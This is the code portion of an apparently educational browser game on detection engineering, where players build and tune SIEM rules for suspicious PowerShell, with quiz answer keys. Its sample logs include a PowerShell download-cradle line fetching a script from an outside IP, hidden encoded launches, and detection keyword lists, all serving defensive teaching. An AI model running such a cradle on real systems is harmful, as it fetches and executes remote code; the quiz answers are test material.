+                    'script_block contains INVOKE-EXPRESSION OR DownloadString OR -enc',
+                    'powershell.exe network_connection = true',
+                    'event_id = 4688 AND process = powershell.exe'
+                ],
+                correct: 1
+            },
+            {
+                label: 'SEVERITY',
+                question: 'What severity level is appropriate for this alert?',
+                options: [
+                    'Informational — log only, no action',
+                    'Low — review within 5 business days',
+                    'High — investigate within 4 hours',
+                    'Critical — page on-call immediately regardless of context'
+                ],
+                correct: 2
+            },
+            {
+                label: 'ALERT TITLE',
+                question: 'Which alert title best follows SIEM naming conventions?',
+                options: [
+                    'PowerShell',
+                    'Bad Script Detected',
+                    '[T1059.001] Suspicious PowerShell Script Block Execution',
+                    'ALERT: powershell.exe ran something'
+                ],
+                correct: 2
+            },
+            {
+                label: 'RESPONSE ACTIONS',
+                question: 'Select the recommended immediate response actions (best answer):',
+                options: [
+                    'Reimage the host immediately without investigation',
+                    'Isolate host, capture memory dump, review parent process chain and script block content',
+                    'Send email to the user asking if they ran PowerShell',
+                    'Block PowerShell.exe in AppLocker for all users company-wide'
+                ],
+                correct: 1
+            }
+        ],
+        score: { correct: 20, partial: 10, bonus: 10 }
+    }
+];
+
+// ─── Generic condition evaluator ───────────────────────────
+// Evaluates an array of {field, operator, value} conditions against a raw log string.
+// Connectors array holds 'AND' or 'OR' strings between conditions.
+function evalConditions(conditions, connectors, logStr) {
+    if (!conditions || conditions.length === 0) return false;
+
+    // Evaluate each condition independently
+    const results = conditions.map(c => {
+        if (!c.value.trim()) return false;
+        const fieldVal = c.field.toLowerCase();
+        const opVal    = c.operator.toLowerCase();
+        const checkVal = c.value.toLowerCase().trim();
+
+        // For simplicity: search log string for value tokens
+        // More realistic: parse key=value pairs
+        const inLog = logStr.includes(checkVal);
+
+        switch (opVal) {
+            case 'contains':       return inLog;
+            case 'does_not_contain': return !inLog;
+            case 'equals':         return inLog;
+            case 'not_equals':     return !inLog;
+            case 'starts_with':    return inLog;
+            case 'ends_with':      return inLog;
+            case '>':
+            case 'greater_than': {
+                // Extract numeric value from log matching fieldVal
+                const re = new RegExp(fieldVal.replace('_','[_=]') + '\\s*=?\\s*(\\d+)', 'i');
+                const m  = logStr.match(re);
+                return m ? parseInt(m[1]) > parseInt(checkVal) : false;
+            }
+            case '<': {
+                const re = new RegExp(fieldVal.replace('_','[_=]') + '\\s*=?\\s*(\\d+)', 'i');
+                const m  = logStr.match(re);
+                return m ? parseInt(m[1]) < parseInt(checkVal) : false;
+            }
+            default: return inLog;
+        }
+    });
+
+    // Fold results using connectors
+    let result = results[0];
+    for (let i = 0; i < connectors.length; i++) {
+        if (connectors[i] === 'OR')  result = result || results[i+1];
+        else                          result = result && results[i+1];
+    }
+    return result;
+}
+
+// ─── Render helpers ────────────────────────────────────────
+function setProgress(lvlIndex) {
+    const pct = (lvlIndex / LEVELS.length) * 100;
+    document.getElementById('progressFill').style.width = pct + '%';
+    document.getElementById('lvlDisplay').textContent = lvlIndex + 1;
+    document.getElementById('scoreDisplay').textContent = totalScore;
+}
+
+function renderDifficultyPips(d) {
+    let html = '';
+    for (let i=1; i<=5; i++) {
+        html += `<span class="difficulty-pip${i<=d?' lit':''}"></span>`;
+    }
+    return html;
+}
+
+function renderLogs(logs, logViewerId) {
+    const el = document.getElementById(logViewerId);
+    if (!el) return;
+    let html = '';
+    let prevTag = null;
+    logs.forEach((log, i) => {
+        if (log.tag !== prevTag) {
+            html += `<div class="log-label">${log.tag === 'malicious' ? '--- SUSPICIOUS ACTIVITY ---' : '--- NORMAL ACTIVITY ---'}</div>`;
+            prevTag = log.tag;
+        }
+        html += `<span class="log-line ${log.tag}"><span class="ts">[${log.t}]</span> ${escHtml(log.raw)}</span>`;
+    });
+    el.innerHTML = html;
+}
+
+function escHtml(str) {
+    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ─── Builder state ─────────────────────────────────────────
+let conditions = []; // [{field, operator, value}]
+let connectors = []; // ['AND'|'OR'] length = conditions.length - 1
+
+function renderBuilder(level) {
+    const bc = document.getElementById('builderContent');
+    if (!bc) return;
+
+    if (level.type === 'dropdown') {
+        renderDropdownLevel(level, bc);
+    } else if (level.type === 'builder') {
+        renderBuilderLevel(level, bc);
+    } else if (level.type === 'tuning') {
+        renderTuningLevel(level, bc);
+    } else if (level.type === 'pipeline') {
+        renderPipelineLevel(level, bc);
+    }
+}
+
+// ── Dropdown level (L1) ──────────────────────────────────
+function renderDropdownLevel(level, bc) {
+    let html = '<div style="margin-bottom:12px;font-size:11px;color:rgba(0,255,65,0.6)">Select the correct rule components:</div>';
+    level.dropdowns.forEach(dd => {
+        html += `<div style="margin-bottom:10px">
+            <div class="mcq-label">${dd.label}</div>
+            <select class="condition-row" id="${dd.id}" style="width:100%;padding:7px 10px;font-size:12px;background:rgba(0,20,10,0.9);border:1px solid rgba(0,255,65,0.3);color:#00ff41;font-family:'Courier New',monospace;border-radius:3px;outline:none;">
+                ${dd.options.map(o=>`<option value="${o}">${o}</option>`).join('')}
+            </select>
+        </div>`;
+    });
+    html += `<div class="btn-row">
+        <button class="btn btn-primary" onclick="testDropdown()">TEST RULE</button>
+    </div>`;
+    bc.innerHTML = html;
+}
+
+function testDropdown() {
+    if (levelTested) return;
+    levelTested = true;
+    const level = LEVELS[currentLevel];
+    let correct = 0;
+    level.dropdowns.forEach(dd => {
+        const sel = document.getElementById(dd.id);
+        if (sel && sel.value === dd.correct) correct++;
+    });
+    const total = level.dropdowns.length;
+    let pts = 0, msg = '', cls = '';
+    if (correct === total) {
+        pts = level.score.correct + level.score.bonus;
+        msg = `Perfect rule. All ${total} components correct. Bonus points awarded for zero false positives.`;
+        cls = 'success';
+    } else if (correct >= Math.ceil(total/2)) {
+        pts = level.score.partial;
+        msg = `${correct}/${total} components correct. The rule would fire but may generate false positives. Review grouping and threshold fields.`;
+        cls = 'partial';
+    } else {
+        pts = 0;
+        msg = `Only ${correct}/${total} correct. An incorrect event type or threshold produces an unreliable detection. Try again.`;
+        cls = 'fail';
+        levelTested = false; // allow retry
+    }
+    showDropdownResults(correct, total, pts, msg, cls);
+}
+
+function showDropdownResults(correct, total, pts, msg, cls) {
+    const rp = document.getElementById('resultsPanel');
+    rp.classList.add('visible');
+    const level = LEVELS[currentLevel];
+    const malicious = 7, benign = 5; // L1 log counts
+    const tp = correct === level.dropdowns.length ? malicious : Math.floor(malicious * correct / level.dropdowns.length);
+    const fp = correct === level.dropdowns.length ? 0 : malicious - tp;
+    rp.innerHTML = `
+        <div class="result-stat"><span class="lbl">COMPONENTS CORRECT</span><span class="${correct===level.dropdowns.length?'val-good':'val-warn'}">${correct} / ${level.dropdowns.length}</span></div>
+        <div class="result-stat"><span class="lbl">EST. TRUE POSITIVES</span><span class="val-good">${tp} / ${malicious}</span></div>
+        <div class="result-stat"><span class="lbl">EST. FALSE POSITIVES</span><span class="${fp===0?'val-good':'val-bad'}">${fp}</span></div>
+        <div class="result-stat"><span class="lbl">POINTS EARNED</span><span class="val-good">+${pts}</span></div>
+        <div class="feedback-msg ${cls}">${msg}</div>
+        ${pts > 0 ? `<div class="btn-row" style="margin-top:10px"><button class="btn btn-next" onclick="advanceLevel(${pts})">NEXT LEVEL &rarr;</button></div>` : ''}
+    `;
+}
+
+// ── Builder level (L2, L3, L4) ──────────────────────────
+function renderBuilderLevel(level, bc) {
+    conditions = [{ field: level.fields[0], operator: level.operators[0], value: '' }];
+    connectors = [];
+    bc.innerHTML = '';
+    redrawConditions(level, bc);
+}
+
+function redrawConditions(level, bc) {
+    bc.innerHTML = '';
+    conditions.forEach((cond, i) => {
+        // Connector row before condition (except first)
+        if (i > 0) {
+            const connHtml = `<div class="connector-row" data-idx="${i-1}">
+                <button class="connector-btn ${connectors[i-1]==='AND'?'active':''}" onclick="setConnector(${i-1},'AND')">AND</button>
+                <button class="connector-btn ${connectors[i-1]==='OR'?'active':''}" onclick="setConnector(${i-1},'OR')">OR</button>
+            </div>`;
+            bc.insertAdjacentHTML('beforeend', connHtml);
+        }
+        // Condition row
+        const rowHtml = `<div class="condition-row" id="crow${i}">
+            <select class="field-sel" onchange="updateCond(${i},'field',this.value)">
+                ${level.fields.map(f=>`<option value="${f}" ${f===cond.field?'selected':''}>${f}</option>`).join('')}
+            </select>
+            <select class="op-sel" onchange="updateCond(${i},'operator',this.value)">
+                ${level.operators.map(o=>`<option value="${o}" ${o===cond.operator?'selected':''}>${o}</option>`).join('')}
+            </select>
+            <input class="val-inp" type="text" placeholder="value..." value="${escHtml(cond.value)}" oninput="updateCond(${i},'value',this.value)">
+            ${conditions.length > 1 ? `<button class="remove-btn" onclick="removeCondition(${i})">✕</button>` : ''}
+        </div>`;
+        bc.insertAdjacentHTML('beforeend', rowHtml);
+    });
+    const btns = `<div class="btn-row">
+        <button class="btn" onclick="addCondition()">+ CONDITION</button>
+        <button class="btn btn-primary" onclick="testBuilderRule()">TEST RULE</button>
+    </div>`;
+    bc.insertAdjacentHTML('beforeend', btns);
+}
+
+function updateCond(i, key, val) {
+    if (conditions[i]) conditions[i][key] = val;
+}
+
+function setConnector(i, val) {
+    connectors[i] = val;
+    const level = LEVELS[currentLevel];
+    const bc    = document.getElementById('builderContent');
+    redrawConditions(level, bc);
+}
+
+function addCondition() {
+    const level = LEVELS[currentLevel];
+    conditions.push({ field: level.fields[0], operator: level.operators[0], value: '' });
+    connectors.push('AND');
+    redrawConditions(level, document.getElementById('builderContent'));
+}
+
+function removeCondition(i) {
+    conditions.splice(i, 1);
+    if (connectors.length > 0) connectors.splice(Math.max(0, i-1), 1);
+    const level = LEVELS[currentLevel];
+    redrawConditions(level, document.getElementById('builderContent'));
+}
+
+function testBuilderRule() {
+    if (levelTested) return;
+    const level = LEVELS[currentLevel];
+    const result = level.evaluate(conditions, connectors);
+    const tpr = result.malicious > 0 ? result.tp / result.malicious : 0;
+    const fpr = result.benign    > 0 ? result.fp / result.benign    : 0;
+
+    let pts = 0, msg = '', cls = '';
+    if (tpr >= 0.8 && fpr <= 0.1) {
+        pts = level.score.correct + (tpr === 1 && fpr === 0 ? level.score.bonus : 0);
+        msg = `Strong detection. Captured ${result.tp}/${result.malicious} threats with only ${result.fp} false positive(s). ${tpr===1&&fpr===0?'Perfect rule — bonus awarded!':''}`;
+        cls = 'success';
+        levelTested = true;
+    } else if (tpr >= 0.5) {
+        pts = level.score.partial;
+        msg = `Partial detection. Caught ${result.tp}/${result.malicious} threats but generated ${result.fp} false positive(s). Refine your conditions.`;
+        cls = 'partial';
+        levelTested = true;
+    } else {
+        pts = 0;
+        msg = `Rule too weak or too broad — only caught ${result.tp}/${result.malicious} threats. Check your field names and values.`;
+        cls = 'fail';
+    }
+
+    const rp = document.getElementById('resultsPanel');
+    rp.classList.add('visible');
+    rp.innerHTML = `
+        <div class="result-stat"><span class="lbl">TRUE POSITIVES</span><span class="val-good">${result.tp} / ${result.malicious}</span></div>
+        <div class="result-stat"><span class="lbl">FALSE POSITIVES</span><span class="${result.fp===0?'val-good':'val-bad'}">${result.fp} / ${result.benign}</span></div>
+        <div class="result-stat"><span class="lbl">MISSED THREATS</span><span class="${result.fn===0?'val-good':'val-warn'}">${result.fn}</span></div>
+        <div class="result-stat"><span class="lbl">POINTS EARNED</span><span class="val-good">+${pts}</span></div>
+        <div class="feedback-msg ${cls}">${msg}</div>
+        ${levelTested ? `<div class="btn-row" style="margin-top:10px"><button class="btn btn-next" onclick="advanceLevel(${pts})">NEXT LEVEL &rarr;</button></div>` : ''}
+    `;
+}
+
+// ── Tuning level (L5) ────────────────────────────────────
+let activeExclusions = new Set();
+
+function renderTuningLevel(level, bc) {
+    activeExclusions.clear();
+    bc.innerHTML = `
+        <div style="font-size:11px;color:rgba(0,255,65,0.6);margin-bottom:10px">
+            BASE RULE: <span style="color:#00ccff">powershell.exe + encoded flag</span><br>
+            Current alerts/day: see meter. Goal: reduce to &lt;10 while catching all 5 threats.
+        </div>
+        <div class="alert-meter">
+            <div style="font-size:11px;color:rgba(0,255,65,0.5);white-space:nowrap">ALERTS/DAY</div>
+            <div class="alert-count-display" id="alertCount">120</div>
+            <div style="flex:1">
+                <div class="alert-bar-wrap"><div class="alert-bar-fill" id="alertBar" style="width:100%"></div></div>
+                <div style="font-size:10px;color:rgba(0,255,65,0.4);margin-top:2px">target: &lt;10 &nbsp;|&nbsp; true threats: <span id="tpRemaining">5</span>/5</div>
+            </div>
+        </div>
+        <div style="font-size:11px;color:rgba(0,255,65,0.5);margin-bottom:8px;letter-spacing:1px">AVAILABLE EXCLUSIONS:</div>
+        ${level.exclusions.map(ex => `
+            <div class="excl-row" id="exrow_${ex.id}" onclick="toggleExclusion('${ex.id}')">
+                <div>
+                    <div style="margin-bottom:2px">${escHtml(ex.label)}</div>
+                    <div class="excl-code">${escHtml(ex.code)}</div>
+                </div>
+                <div style="text-align:right">
+                    <div class="excl-impact">-${ex.removes} alerts</div>
+                    ${ex.removesTp > 0 ? `<div style="color:#ff6666;font-size:10px">-${ex.removesTp} TP</div>` : ''}
+                    <div class="excl-checkbox" id="excheck_${ex.id}"></div>
+                </div>
+            </div>
+        `).join('')}
+        <div class="btn-row" style="margin-top:12px">
+            <button class="btn btn-primary" onclick="testTuning()">APPLY EXCLUSIONS</button>
+        </div>
+    `;
+}
+
+function toggleExclusion(id) {
+    if (levelTested) return;
+    if (activeExclusions.has(id)) {
+        activeExclusions.delete(id);
+        document.getElementById('exrow_' + id).classList.remove('active');
+        document.getElementById('excheck_' + id).textContent = '';
+    } else {
+        activeExclusions.add(id);
+        document.getElementById('exrow_' + id).classList.add('active');
+        document.getElementById('excheck_' + id).textContent = '✓';
+    }
+    recalcAlerts();
+}
+
+function recalcAlerts() {
+    const level = LEVELS[currentLevel];
+    let alertsRemoved = 0, tpRemoved = 0;
+    activeExclusions.forEach(id => {
+        const ex = level.exclusions.find(e => e.id === id);
+        if (ex) { alertsRemoved += ex.removes; tpRemoved += ex.removesTp; }
+    });
+    const current = Math.max(level.truePositives, level.baseAlerts - alertsRemoved);
+    const tpLeft  = level.truePositives - tpRemoved;
+    const maxAlerts = level.baseAlerts;
+    const pct = (current / maxAlerts) * 100;
+
+    const countEl = document.getElementById('alertCount');
+    const barEl   = document.getElementById('alertBar');
+    const tpEl    = document.getElementById('tpRemaining');
+    if (!countEl) return;
+
+    countEl.textContent = current;
+    tpEl.textContent    = tpLeft;
+    barEl.style.width   = pct + '%';
+
+    if (current < 10 && tpLeft === level.truePositives) {
+        countEl.className = 'alert-count-display good';
+        barEl.className   = 'alert-bar-fill good';
+    } else if (current < 30) {
+        countEl.className = 'alert-count-display warn';
+        barEl.className   = 'alert-bar-fill warn';
+    } else {
+        countEl.className = 'alert-count-display';
+        barEl.className   = 'alert-bar-fill';
+    }
+}
+
+function testTuning() {
+    if (levelTested) return;
+    const level = LEVELS[currentLevel];
+    let alertsRemoved = 0, tpRemoved = 0;
+    activeExclusions.forEach(id => {
+        const ex = level.exclusions.find(e => e.id === id);
+        if (ex) { alertsRemoved += ex.removes; tpRemoved += ex.removesTp; }
+    });
+    const finalAlerts = level.baseAlerts - alertsRemoved;
+    const tpLeft      = level.truePositives - tpRemoved;
+
+    let pts = 0, msg = '', cls = '';
+    if (finalAlerts < 10 && tpLeft === level.truePositives) {
+        pts = level.score.correct + level.score.bonus;
+        msg = `Excellent tuning. Reduced alert volume to ${finalAlerts}/day while retaining all ${tpLeft} true positives. ` +
+              `False positive rate: ${Math.round((finalAlerts - tpLeft) / finalAlerts * 100)}%. Bonus awarded.`;
+        cls = 'success';
+        levelTested = true;
+    } else if (finalAlerts < 30 && tpLeft >= 4) {
+        pts = level.score.partial;
+        msg = `Partial improvement. ${finalAlerts} alerts/day, ${tpLeft}/5 true positives retained. ` +
+              `Try adding more safe exclusions to get below the 10/day threshold.`;
+        cls = 'partial';
+        levelTested = true;
+    } else if (tpRemoved > 0) {
+        pts = 0;
+        msg = `Warning: exclusion(s) removed ${tpRemoved} true positive(s). You cannot exclude threats. Remove risky exclusions.`;
+        cls = 'fail';
+    } else {
+        pts = 0;
+        msg = `Alert volume still too high (${finalAlerts}/day). Add more targeted exclusions for service accounts, maintenance windows, and known-good sources.`;
+        cls = 'fail';
+    }
+
+    const rp = document.getElementById('resultsPanel');
+    rp.classList.add('visible');
+    rp.innerHTML = `
+        <div class="result-stat"><span class="lbl">ALERTS / DAY</span><span class="${finalAlerts<10?'val-good':finalAlerts<30?'val-warn':'val-bad'}">${finalAlerts}</span></div>
+        <div class="result-stat"><span class="lbl">TRUE POSITIVES RETAINED</span><span class="${tpLeft===5?'val-good':'val-bad'}">${tpLeft} / 5</span></div>
+        <div class="result-stat"><span class="lbl">EXCLUSIONS APPLIED</span><span class="val-good">${activeExclusions.size}</span></div>
+        <div class="result-stat"><span class="lbl">POINTS EARNED</span><span class="val-good">+${pts}</span></div>
+        <div class="feedback-msg ${cls}">${msg}</div>
+        ${levelTested ? `<div class="btn-row" style="margin-top:10px"><button class="btn btn-next" onclick="advanceLevel(${pts})">FINAL LEVEL &rarr;</button></div>` : ''}
+    `;
+}
+
+// ── Pipeline level (L6) ──────────────────────────────────
+let pipelineAnswers = {};
+
+function renderPipelineLevel(level, bc) {
+    pipelineAnswers = {};
+    let html = `<div style="font-size:11px;color:rgba(0,255,65,0.6);margin-bottom:12px">
+        Complete all 5 pipeline steps for T1059.001:
+    </div>`;
+    level.steps.forEach((step, si) => {
+        html += `<div class="mcq-group" id="pstep${si}">
+            <div class="mcq-label">[STEP ${si+1}] ${step.label}</div>
+            <div style="font-size:11px;color:rgba(0,255,65,0.75);margin-bottom:6px">${escHtml(step.question)}</div>
+            <div class="mcq-options">
+                ${step.options.map((opt, oi) => `
+                    <button class="mcq-opt" id="popt_${si}_${oi}" onclick="selectPipelineOpt(${si},${oi})">${escHtml(opt)}</button>
+                `).join('')}
+            </div>
+        </div>`;
+    });
+    html += `<div class="btn-row" style="margin-top:12px">
+        <button class="btn btn-primary" onclick="testPipeline()">SUBMIT PIPELINE</button>
+    </div>`;
+    bc.innerHTML = html;
+}
+
+function selectPipelineOpt(stepIdx, optIdx) {
+    if (levelTested) return;
+    const level = LEVELS[currentLevel];
+    // Deselect all options in this step
+    level.steps[stepIdx].options.forEach((_, oi) => {
+        document.getElementById(`popt_${stepIdx}_${oi}`).classList.remove('selected');
+    });
+    document.getElementById(`popt_${stepIdx}_${optIdx}`).classList.add('selected');
+    pipelineAnswers[stepIdx] = optIdx;
+}
+
+function testPipeline() {
+    if (levelTested) return;
+    const level  = LEVELS[currentLevel];
+    const total  = level.steps.length;
+    const answered = Object.keys(pipelineAnswers).length;
+    if (answered < total) {
+        showPipelineResults(0, `Please answer all ${total} steps before submitting.`, 'fail', false);
+        return;
+    }
+
+    let correct = 0;
+    level.steps.forEach((step, si) => {
+        const chosen = pipelineAnswers[si];
+        const btn = document.getElementById(`popt_${si}_${chosen}`);
+        if (chosen === step.correct) {
+            correct++;
+            if (btn) btn.classList.add('correct');
+        } else {
+            if (btn) btn.classList.add('wrong');
+            // highlight correct
+            const correctBtn = document.getElementById(`popt_${si}_${step.correct}`);
+            if (correctBtn) correctBtn.classList.add('correct');
+        }
+    });
+
+    let pts = 0, msg = '', cls = '';
+    if (correct === total) {
+        pts = level.score.correct + level.score.bonus;
+        msg = `Outstanding. All ${total} pipeline components correct. This is a production-quality detection rule.`;
+        cls = 'success';
+    } else if (correct >= Math.ceil(total/2)) {
+        pts = level.score.partial;
+        msg = `${correct}/${total} steps correct. Good foundation but review the highlighted steps — each error would degrade detection quality.`;
+        cls = 'partial';
+    } else {
+        pts = 0;
+        msg = `${correct}/${total} steps correct. Review the MITRE ATT&CK entry for T1059.001 and study detection data sources.`;
+        cls = 'fail';
+    }
+    levelTested = true;
+    showPipelineResults(pts, msg, cls, true);
+}
+
+function showPipelineResults(pts, msg, cls, showNext) {
+    const rp = document.getElementById('resultsPanel');
+    rp.classList.add('visible');
+    rp.innerHTML = `
+        <div class="result-stat"><span class="lbl">POINTS EARNED</span><span class="val-good">+${pts}</span></div>
+        <div class="feedback-msg ${cls}">${msg}</div>
+        ${showNext ? `<div class="btn-row" style="margin-top:10px"><button class="btn btn-next" onclick="advanceLevel(${pts})">COMPLETE LAB &rarr;</button></div>` : ''}
+    `;
+}
+
+// ─── Level lifecycle ───────────────────────────────────────
+function loadLevel(idx) {
+    if (idx >= LEVELS.length) { showCompletion(); return; }
+    currentLevel = idx;
+    levelTested  = false;
+    const level  = LEVELS[idx];
+
+    // Update meta
+    setProgress(idx);
+
+    // Scenario + title
+    document.getElementById('scenarioTitle').innerHTML =
+        `<span class="level-badge">LEVEL ${level.id} / 6 &nbsp;|&nbsp; ${renderDifficultyPips(level.difficulty)}</span><br>${level.name}`;
+    document.getElementById('scenarioDesc').textContent = level.scenario;
+
+    // Logs (tuning and pipeline have bespoke logs)
+    const logViewer = document.getElementById('logViewer');
+    if (level.type === 'tuning') {
+        logViewer.innerHTML = `
+            <div class="log-label">EXISTING RULE</div>
+            <span class="log-line highlight">detection: process_name contains "powershell.exe" AND command_line contains "-enc"</span>
+            <div class="log-label">SAMPLE ALERTS (last 100 of 120 today)</div>
+            <span class="log-line benign">[09:02:01] svc_deploy ran powershell -enc &lt;build_script&gt; [SERVICE ACCOUNT]</span>
+            <span class="log-line benign">[09:02:03] svc_monitor ran powershell -enc &lt;health_check&gt; [SERVICE ACCOUNT]</span>
+            <span class="log-line benign">[09:15:00] admin1@10.0.0.5 ran powershell -enc &lt;maintenance&gt; [ADMIN IP]</span>
+            <span class="log-line benign">[02:30:00] taskeng.exe → powershell -enc &lt;backup_job&gt; [SCHEDULED TASK]</span>
+            <span class="log-line benign">[03:00:00] taskeng.exe → powershell -enc &lt;patch_script&gt; [MAINT WINDOW]</span>
+            <span class="log-line malicious">[10:44:12] user=jdoe src=203.0.113.55 powershell -enc JABjAG0AZAAgAD0A... [THREAT]</span>
+            <span class="log-line malicious">[10:44:15] user=jdoe src=203.0.113.55 powershell -enc SQBFAFgAIAAoAE4A... [THREAT]</span>
+            <span class="log-line malicious">[11:01:00] user=rogue src=45.33.32.156 powershell -enc cGF5bG9hZA...     [THREAT]</span>
+            <span class="log-line benign">[11:30:00] svc_patch@10.0.0.10 powershell -enc &lt;wsus_script&gt; [ADMIN IP]</span>
+            <span class="log-line malicious">[14:00:01] user=attacker src=91.108.4.1 powershell -nop -enc aQBlAHg...   [THREAT]</span>
+            <span class="log-line malicious">[14:00:04] user=attacker src=91.108.4.1 powershell -w hidden -enc dGhpcw... [THREAT]</span>
+        `;
+    } else if (level.type === 'pipeline') {
+        logViewer.innerHTML = `
+            <div class="log-label">MITRE ATT&CK: T1059.001 - PowerShell</div>
+            <span class="log-line highlight">Tactic: Execution | Platform: Windows</span>
+            <span class="log-line benign">Adversaries abuse PowerShell commands and scripts for execution.</span>
+            <span class="log-label">EXAMPLE TELEMETRY (Script Block Log - Event 4104)</span>
+            <span class="log-line malicious">[14:01:00] ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.156/p.ps1')</span>
+            <span class="log-line malicious">[14:01:02] ScriptBlock: Invoke-Expression $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBlAHgA')))</span>
+            <span class="log-line benign">[14:05:00] ScriptBlock: Get-Service | Where-Object {$_.Status -eq "Running"}</span>
+            <span class="log-label">PROCESS CREATION (Event 4688)</span>
+            <span class="log-line malicious">[14:01:00] powershell.exe -nop -w hidden -enc aQBlAHgAIAAo... parent=cmd.exe user=jdoe</span>
+            <span class="log-line benign">[14:04:00] powershell.exe Get-Process  parent=explorer.exe user=msmith</span>
+            <span class="log-label">DETECTION REFERENCES</span>
+            <span class="log-line benign">Data sources: Process creation, Script block logging, Module load</span>
+            <span class="log-line benign">Atomic Tests: T1059.001 | Detection: script_block + encoded + download cradles</span>
+        `;
+    } else {
+        renderLogs(level.logs, 'logViewer');
+    }
+
+    // Clear results
+    const rp = document.getElementById('resultsPanel');
+    rp.classList.remove('visible');
+    rp.innerHTML = '';
+
+    // Render builder
+    renderBuilder(level);
+}
+
+function advanceLevel(pts) {
+    levelScores.push({ id: currentLevel + 1, name: LEVELS[currentLevel].name, pts });
+    totalScore += pts;
+    document.getElementById('scoreDisplay').textContent = totalScore;
+    loadLevel(currentLevel + 1);
+}
+
+// ─── Completion screen ─────────────────────────────────────
+function showCompletion() {
+    document.getElementById('mainPanels').classList.add('hidden');
+    document.getElementById('completionScreen').classList.add('visible');
+    document.getElementById('progressFill').style.width = '100%';
+    document.getElementById('lvlDisplay').textContent = '6';
+
+    const pct   = Math.round((totalScore / MAX_SCORE) * 100);
+    let rank    = '';
+    if      (pct >= 90) rank = 'Principal Detection Architect';
+    else if (pct >= 75) rank = 'Detection Engineer';
+    else if (pct >= 50) rank = 'Detection Analyst';
+    else                rank = 'Alert Monkey';
+
+    document.getElementById('finalScore').textContent  = `${totalScore} / ${MAX_SCORE}`;
+    document.getElementById('scoreDetail').textContent  = `${pct}% accuracy`;
+    document.getElementById('rankDisplay').textContent  = rank;
+
+    // Breakdown table
+    const tbody = document.getElementById('breakdownBody');
+    let rows = '';
+    levelScores.forEach(ls => {
+        rows += `<tr><td>${ls.id}</td><td>${escHtml(ls.name)}</td><td class="pts">+${ls.pts}</td></tr>`;
+    });
+    tbody.innerHTML = rows;
+
+    // XP + achievement
+    awardXP(totalScore, MAX_SCORE, rank);
+}
+
+function awardXP(score, maxScore, rank) {
+    if (!localStorage.getItem('game_detectioneng_xp_awarded')) {
+        const currentXP = parseInt(localStorage.getItem('hexworth_xp') || '0');
+        localStorage.setItem('hexworth_xp', (currentXP + 100).toString());
+        localStorage.setItem('game_detectioneng_xp_awarded', 'true');
+        if (typeof FirestoreManager !== 'undefined' && FirestoreManager.addXP) {
+            const uid = localStorage.getItem('hexworth_uid');
+            if (uid) FirestoreManager.addXP(uid, 100, 'Detection Engineering Lab Complete');
+        }
+    }
+    if (typeof AchievementManager !== 'undefined') {
+        AchievementManager.unlock('game_detectioneng');
+    }
+    if (typeof GameTracker !== 'undefined') {
+        GameTracker.record('detectioneng', { score, maxScore, rank });
+    }
+}
+
+// ─── Boot ──────────────────────────────────────────────────
+loadLevel(0);
+</script>
+</body>
+</html>
